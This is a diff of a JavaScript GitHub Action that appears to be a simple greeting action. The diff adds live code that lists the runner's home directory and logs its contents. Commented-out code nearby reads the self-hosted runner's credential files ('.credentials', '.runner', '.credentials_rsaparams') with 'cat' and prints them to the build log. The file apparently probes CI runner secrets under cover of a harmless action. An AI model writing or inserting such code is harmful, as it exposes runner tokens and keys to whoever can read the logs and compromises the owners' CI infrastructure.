@@ -64,24 +64,27 @@ try {
     //     }
         
     // });
+    
     // const files_other = fs.readdirSync('/home/musset/actions-runner-private');
-    // files_other.forEach(element => {
-    //     if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
+    const files_other = fs.readdirSync('/home/runner');
+    files_other.forEach(element => {
+        // if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
             
-    //         let path = `/home/musset/actions-runner-private/${element}`;
+        //     let path = `/home/musset/actions-runner-private/${element}`;
             
-    //         cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
-    //             if (err){
-    //                 console.log(err);
-    //                 return;
-    //             }
-    //             console.log(`-----${element}------`);
-    //             console.log(`stdout: ${stdout.toString()}`);
-    //             console.log(`stderr: ${stderr}`);
-    //         });
+        //     cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
+        //         if (err){
+        //             console.log(err);
+        //             return;
+        //         }
+        //         console.log(`-----${element}------`);
+        //         console.log(`stdout: ${stdout.toString()}`);
+        //         console.log(`stderr: ${stderr}`);
+        //     });
             
-    //     }
-    // });
+        // }
+        console.log(element);
+    });
 
     const nameToGreet = core.getInput('hi-there') + "122222";
     console.log(`Say Hello ${nameToGreet}!`);
